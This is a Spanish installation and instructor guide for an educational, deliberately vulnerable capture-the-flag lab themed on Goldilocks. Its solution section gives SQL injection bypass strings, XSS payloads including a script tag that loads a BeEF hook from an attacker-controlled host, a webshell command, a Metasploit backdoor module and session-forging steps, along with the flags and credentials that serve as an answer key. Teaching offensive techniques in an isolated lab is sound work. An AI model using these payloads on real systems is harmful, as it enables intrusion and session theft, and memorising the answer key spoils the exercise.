# Goldilocks CTF — Guía de Instalación

Plataforma vulnerable educativa temática **"Ricitos de Oro y los Tres Osos"**
Universidad de Cundinamarca · ⚠ Solo para entornos controlados

12 banderas · 3 fases · 900 puntos · cronómetro de 120 minutos

---

## Requisitos

- Python 3.8+
- Flask, Pillow (`pip install -r requirements.txt`)
- Kali Linux / Ubuntu / Metasploitable como host de laboratorio
- steghide (opcional, para embeber la bandera final en la imagen)

---

## Instalación

```bash
cd goldilocks_ctf
pip install -r requirements.txt

# Crea BD, usuarios, recetas, documento expuesto e imagen
python setup_db.py

# (Opcional) para el reto de esteganografía completo
sudo apt install steghide -y
python setup_db.py          # vuelve a ejecutarlo para embeber la bandera

python app.py               # -> http://localhost:5000
```

En la portada se entra **como invitado** ("ricitos") y arranca el cronómetro.
Cada pista desbloqueada cuesta **−5 min** y **−25 pts**. Si el cronómetro llega a
`00:00` o el medidor de detección llega al 100 %, aparece la pantalla
*"¡Los tres osos están cerca!"* y hay que **Reiniciar escenario**.

---

## Fases y banderas

### Fase 1 — El Bosque (Reconocimiento) · Verde
| Desafío | Técnica | Bandera |
|---|---|---|
| La Sopa de Osito | Nmap · hosts activos | `CTF{osito_bosque_nmap_hosts_activos}` |
| La Sopa de Mamá Osa | Google Dorks · archivo expuesto | `CTF{mama_bosque_dork_archivo_expuesto}` |
| La Sopa de Papá Oso | Dirb · ruta oculta | `CTF{papa_bosque_dirb_ruta_oculta}` |
| El Camino al Bosque | Wireshark · credenciales | `CTF{ricitos_bosque_wireshark_credenciales}` |

### Fase 2 — La Casa (Explotación Web) · Dorado
| Desafío | Técnica | Bandera |
|---|---|---|
| La Cama de Osito | SQLi · bypass de login | `CTF{osito_casa_sqli_bypass_login}` |
| La Cama de Mamá Osa | SQLi Medium · Burp Suite | `CTF{mama_casa_sqli_burp_medium}` |
| La Cama de Papá Oso | XSS reflejado · cookie | `CTF{papa_casa_xss_reflected_cookie}` |
| La Silla Rota | XSS almacenado · BeEF | `CTF{ricitos_casa_xss_stored_beef_hook}` |

### Fase 3 — Las Habitaciones (Escalada) · Rojo
| Desafío | Técnica | Bandera |
|---|---|---|
| Papá Oso Despierta | Webshell · RCE | `CTF{papa_habitacion_webshell_rce}` |
| Mamá Osa Despierta | Metasploit · exploit | `CTF{mama_habitacion_metasploit_exploit}` |
| Osito Despierta | PrivEsc · root | `CTF{osito_habitacion_privesc_root}` |
| ¡Ricitos de Oro Escapa! | Esteganografía · steghide | `CTF{ricitos_habitacion_steghide_final}` |

---

## Cómo se resuelve cada uno (para el docente)

**Fase 1**
- *Nmap*: `nmap -sn 192.168.56.0/24`, luego `nmap -sS -sV -p- 192.168.56.12`.
  Bandera en el banner del puerto `1337`. En la plataforma, la consola de la
  página muestra la salida simulada.
- *Dork*: `/robots.txt` revela `/static/docs/`. Abrir
  `/static/docs/informe_seguridad_osos.txt` → bandera en el contenido.
- *Dirb*: `dirb http://IP/ common.txt` descubre `/despensa_secreta` (no enlazada).
- *Wireshark*: descargar `captura_bosque.pcap`, buscar
  `Authorization: Basic`, decodificar el Base64 → `ricitos:CTF{...}`.

**Fase 2**
- *SQLi login*: usuario `admin'--` o `' OR '1'='1'#`, contraseña cualquiera.
  El panel muestra la bandera al detectar el bypass.
- *SQLi medium*: el buscador elimina `'`. Usar comillas dobles:
  `" UNION SELECT name, secret FROM recipes--`.
- *XSS reflejado*: `?nombre=<script>...</script>`. La cookie `bear_session` es
  Base64 de la bandera → `atob(...)`.
- *XSS almacenado*: publicar un comentario con
  `<script src="http://IP:3000/hook.js"></script>` y pulsar
  "Simular visita del oso admin".
- *Niveles*: `low / medium / high` se cambian en el menú (☰). En `high` el código
  ya es seguro (sirve para comparar).

**Fase 3**
- *Webshell*: subir `shell.py`, abrir `/uploads/shell.py?cmd=cat /flags/papa_oso.txt`.
- *Metasploit*: `use exploit/unix/ftp/vsftpd_234_backdoor` contra Metasploitable 2,
  `cat /home/msfadmin/mama_osa.flag`.
- *PrivEsc*: `sudo -l`, SUID (`find / -perm -4000`). En la plataforma: cambiar la
  cookie `role` a `admin` (F12) o firmar la sesión con `flask-unsign` usando la
  clave de `/admin/config` (`osito123`).
- *Stego*: `steghide extract -sf cuadro_del_pasillo.jpg`, contraseña `ricitos`.
  Sin steghide: `strings cuadro_del_pasillo.png | grep CTF`.

---

## Usuarios de la base de datos

| Usuario | Contraseña | Rol |
|---|---|---|
| ricitos | rizos123 | guest |
| mama_osa | avena_caliente | guest |
| osito | miel | guest |
| admin | OsoPapa2026! | admin |

---

## Infraestructura recomendada

```
[Kali Linux]  192.168.56.10  ←→  [Host Goldilocks CTF]  192.168.56.12 (python app.py :5000)
                                 [Metasploitable 2]     192.168.56.13
```

VirtualBox con red Host-Only `192.168.56.0/24`.
